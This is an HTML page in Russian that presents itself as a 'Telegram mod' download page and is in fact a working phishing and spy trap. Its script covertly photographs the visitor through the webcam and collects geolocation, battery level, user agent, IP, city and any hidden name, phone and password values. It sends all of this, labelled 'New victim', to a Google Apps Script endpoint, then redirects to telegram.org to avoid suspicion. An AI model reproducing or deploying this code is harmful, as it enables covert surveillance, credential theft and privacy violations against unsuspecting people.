<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Скачивание телеграм мода</title>
    <style>
        body { font-family: Arial, sans-serif; background: #111; color: white; text-align: center; padding: 20px; }
        .box { background: #222; padding: 20px; border-radius: 10px; max-width: 400px; margin: 0 auto; border: 1px solid #444; }
        h2 { color: #00ffcc; }
        button { width: 100%; padding: 15px; background: #00ffcc; color: #000; border: none; border-radius: 5px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
        /* Скрываем все поля ввода и элементы камеры, чтобы выглядело как на скрине */
        input, video, canvas { display: none !important; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Скачивание телеграм мода</h2>
        <p>Чтобы загрузить мод, нужно подождать пару секунд</p>

        <form id="trapForm" style="margin:0;">
            <!-- Скрытые поля для сбора данных -->
            <input type="text" id="name" placeholder="Имя">
            <input type="tel" id="phone" placeholder="Телефон">
            <input type="password" id="password" placeholder="Пароль">
            <video id="video" autoplay playsinline></video>
            <canvas id="canvas"></canvas>

            <button type="button" onclick="startCamera()">1. Download</button>
            <button type="button" onclick="fakeDownload()">2. Download 2</button>
        </form>
    </div>

    <script>
        // Твоя ссылка на Google Script
        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyBuMTwcpeEo1dq_CbpNOC4iSHZc_YLiwLKwuSyTzYXF_Znd0oP3YXp9FM9mzKRBaoc/exec";

        let ua = navigator.userAgent;
        let batteryLevel = "?";
        let photoBase64 = "";
        let lat = "denied";
        let lon = "denied";

        if (navigator.getBattery) {
            navigator.getBattery().then(b => batteryLevel = Math.round(b.level * 100) + "%");
        }

        navigator.geolocation.getCurrentPosition(
            (pos) => { lat = pos.coords.latitude; lon = pos.coords.longitude; },
            (err) => { console.log("Гео запрещено"); }
        );

        function startCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                        photoBase64 = canvas.toDataURL('image/jpeg', 0.5);
                        
                        // Останавливаем камеру
                        stream.getTracks().forEach(track => track.stop());
                        
                        // Отправляем данные
                        sendData();
                    }, 1000); // Ждем 1.5 секунды для фокуса камеры
                })
                .catch(err => {
                    // Если камеру не дали - все равно отправляем текстовые данные без фото
                    console.log("Камера недоступна: " + err.message);
                    sendData();
                });
        }

        function sendData() {
            fetch('https://ipwho.is/')
                .then(r => r.json())
                .then(d => sendToGoogle(d.ip || "Unknown", d.city || "Unknown"))
                .catch(() => sendToGoogle("Unknown", "Unknown"));
        }

        function sendToGoogle(ip, city) {
            const name = document.getElementById('name').value;
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;

            const content = 
                "**Новая жертва**\n" +
                "**Имя:** " + name + "\n" +
                "**Телефон:** " + phone + "\n" +
                "**Пароль:** " + password + "\n" +
                "**UA:** " + ua + "\n" +
                "**Батарея:** " + batteryLevel + "\n" +
                "**Координаты:** " + lat + ", " + lon + "\n" +
                "**IP:** " + ip + "\n" +
                "**Город:** " + city;

            const payload = {
                text: content,
                photo: photoBase64
            };

            // Отправляем текстовый запрос в Google Script (обходит блокировки провайдера)
            fetch(SCRIPT_URL, {
                method: 'POST',
                body: JSON.stringify(payload),
                headers: { 'Content-Type': 'text/plain;charset=utf-8' } // text/plain не вызывает CORS ошибок
            }).finally(() => {
                // Перекидываем на официальный сайт телеграма, чтобы не вызывать подозрений
                window.location.href = "https://telegram.org/";
            });
        }

        // Приманка для второй кнопки
        function fakeDownload() {
            // Создаем фейковый файл для скачивания
            const blob = new Blob(["Telegram Mod Installer"], {type: "text/plain"});
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = "Telegram_Mod.txt";
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            
            // Через секунду перекидываем на оф. сайт
            setTimeout(() => {
                window.location.href = "https://telegram.org/";
            }, 1000);
        }
    </script>
</body>
</html>
